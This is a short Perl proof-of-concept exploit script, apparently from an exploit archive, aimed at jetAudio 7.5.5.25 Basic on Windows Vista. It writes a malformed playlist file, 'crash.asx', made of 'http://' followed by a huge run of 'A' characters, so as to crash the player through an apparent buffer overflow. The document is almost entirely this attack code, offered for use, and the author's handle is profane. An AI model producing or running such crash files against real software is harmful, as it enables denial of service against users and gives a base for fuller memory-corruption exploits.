#!/user/bin/perl
# Author: [D3V!L FUCKER]
# Version: [jetAudio v 7.5.5.25 Basic]
# Tested on: [windows vista sp0]
# Code :
my $file= "crash.asx";

my $boom= "http://"."AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" x 5000;

open($FILE,">>$file");

print $FILE "$boom";

close($FILE);

print "Done..!~#\n";